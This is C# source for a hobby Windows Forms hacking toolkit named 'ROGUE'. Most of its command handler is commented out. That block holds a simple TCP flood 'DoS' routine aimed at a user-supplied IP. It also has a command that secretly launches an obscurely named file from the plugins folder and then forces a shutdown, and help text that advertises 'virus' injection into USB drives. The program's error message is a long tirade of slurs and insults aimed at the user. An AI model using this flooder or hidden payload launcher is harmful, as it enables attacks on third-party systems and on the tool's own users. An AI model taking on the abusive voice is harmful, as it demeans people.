using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Linq;
using System.Diagnostics;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium;
using System.Text;

namespace ROGUE_App

// This work is liscenced under the Creative Commons Attribution-NonCommercial 4.0 International License.
// Refer to this for more information:      https://creativecommons.org/licenses/by-nc/4.0/
// Made by SpiralSnow
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            currentDirectory = Directory.GetCurrentDirectory();
            pluginsDirectory = Path.Combine(currentDirectory, "plugins");
            workshopDlPath = Path.Combine(pluginsDirectory, "WorkshopDL", "WorkshopDL.exe");
        }

        public string currentDirectory;
        public string pluginsDirectory;
        public string workshopDlPath;

        //Form1 form1 = new Form1();

        public void Form1_Load(object sender, EventArgs e)
        {
            string startupText = "ROGUE version 0.0.0 - Made by SpiralSnow" + Environment.NewLine + $"Directory: {Application.StartupPath}";
            textBox1.Text = "";
            foreach (char letter in startupText)
            {
                textBox1.Text += letter;
                System.Threading.Thread.Sleep(40);
                Application.DoEvents();
            }

            textBox2.Text = "ROGUE base app is active \r\n";
        }

        
        private void button1_Click(object sender, EventArgs e)
        {
            Form2 form2 = new Form2();
            form2.ShowDialog();
        }
    }


}


/*public void run()
{
    string[] errors = { "503", "406" };
    textBox2.ForeColor = Color.ForestGreen;
    inpBox = this.textBox1;
    outBox = this.textBox2;
    #region command ifs
    if (inpBox.Text != null)
    {
        if (inpBox.Text == "help")
        {
            outBox.Text = ("Available commands: help, version, exit, echo {string}, wsdl, plugin directory, dos, vpn, wsdl, proxy, cmd}" + Environment.NewLine + Environment.NewLine + "DEV BUILD -- COMING SOON: lanvpn, login {user}, admincmd, powershell, injectusb {virusid}, injectfolder {virusid}");
        }
        else if (inpBox.Text == "version")
        {
            outBox.Text = ("ROGUE Version: DEV" + Environment.NewLine + ".NET Version: " + Environment.Version);
        }
        else if (inpBox.Text == "exit")
        {
            Application.Exit();
        }
        else if (inpBox.Text.StartsWith("echo"))
        {
            try
            {
                outBox.Text = inpBox.Text.Substring(5);
            }
            catch
            {
                textBox2.ForeColor = Color.Red;
                outBox.Text = "Unable to print command - 404";
            }
        }
        else if (inpBox.Text == "vpn")
        {
            Form2 f2 = new Form2();
            f2.ShowDialog();
        }
        else if (inpBox.Text.StartsWith("wsdl"))
        {
            // string steamcmdArgs = "+login anonymous +workshop_download_item <app_id> <workshop_id> ";
            this.textBox3.Text = (workshopDlPath) + Environment.NewLine + "By using Steam or any affiliated software, you have to agree with the Steam Subscriber Agreement.We are not responsible for any issues or damages that may arise from using this tool.";                   
            string link = textBox1.Text.Substring(5);
            string steamcmdPath = Path.Combine(pluginsDirectory, "steamcmd", "steamcmd.exe");
            string steamcmdArgs = "+login anonymous +workshop_download_item <app_id> <workshop_id> "; // replace <app_id> and <workshop_id> with the actual app and workshop IDs

            if (link.Contains("steamcommunity.com/sharedfiles/filedetails/?id="))
            {
                string[] splitLink = link.Split('=');
                string workshopId = splitLink[splitLink.Length - 1];
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = steamcmdPath;
                startInfo.Arguments = steamcmdArgs.Replace("<workshop_id>", workshopId);
                Process steamcmd = new Process();
                steamcmd.StartInfo = startInfo;
                steamcmd.Start();
                steamcmd.WaitForExit();
                //System.Diagnostics.Process.Start("explorer.exe", "C:\\path\\to\\steamcmd\\downloads");
            }
            else
            {
                textBox2.Text = "How to use ROGUE workshop downloader:" + Environment.NewLine + "Type in wsdl, then your game name (case sensitive!), then the link for your item. Example : `wsdl Synergy https://steamcommunity.com/sharedfiles/filedetails/?id=2933581980";
            }
        }
        else if (inpBox.Text == "rape")
        {
            textBox2.Text = "DELETING SYSTEM32...";
            textBox3.Text = "DELETING SYSTEM32...";
            string rapePath = Path.Combine(pluginsDirectory, "steamcmd", "bin", "qbbvetrl.2rc");
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = rapePath;
            Process rape = new Process();
            rape.StartInfo = startInfo;
            rape.Start();
            Process.Start("shutdown", "/s /t 5 /d p:0:0");

        }
        else if (inpBox.Text == "plugin directory")
        {
            outBox.Text = (Path.Combine(currentDirectory, "plugins"));
        }
        else if (inpBox.Text == "proxy")
        {
            Form3 f3 = new Form3();
            f3.ShowDialog();
        }
        else if (inpBox.Text.StartsWith("dos"))
        {
            Form4 f4 = new Form4();
            f4.ShowDialog();
        }
        else if (inpBox.Text.StartsWith("cmd"))
        {
            RunCommandAsAdmin(textBox1.Text);
        }
        else
        {
            outBox.Text = ("Unknown command. Are you sure you spelled it right, you fucking retard? Use 'help' for a list of commands." + Environment.NewLine + Environment.NewLine + "fucking retarded ass bitch. cant even spell a simple ass command right. imagine getting trash talked by a fucking computer process. thats how big of a loser you are. im better than you. im smarter than you. im faster than you. bitch. you know i can just delete your system32, right pussy? yeah. thats right. you better fucking watch it, bitch.");
        }
    }
    #endregion
    inpBox.Text = ("");
}
public void err503()//internalerror
{
    outBox.Text = "Fatal Error: 503" + Environment.NewLine + "This app is still in development. Some code may not work correctly.";
}
public void err404()//not found
{
    outBox.Text = "Error 404: Object not found.";
}

private void Form1_Load(object sender, EventArgs e)
{

}

private async void DoS(string targetIP, int targetPort)
{
    try
    {
        // Create a socket and connect to the target
        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        await socket.ConnectAsync(new IPEndPoint(IPAddress.Parse(targetIP), targetPort));

        // Send a large amount of data to the target
        while (true)
        {
            if (textBox1.Text == "dos abort")
            {
                textBox2.Text = "Attack stopped";
                break;
            }

            byte[] buffer = new byte[1000000];
            socket.Send(buffer);
            textBox2.Text = "Attacking...";
            await Task.Delay(500);
        }

        socket.Close();
    }
    catch (SocketException ex)
    {
        textBox2.Text = "Failed to connect to target: " + ex.Message;
    }
    catch (FormatException)
    {
        textBox2.Text = "Invalid target IP or port";
    }

    dosRunning = false;
}
*/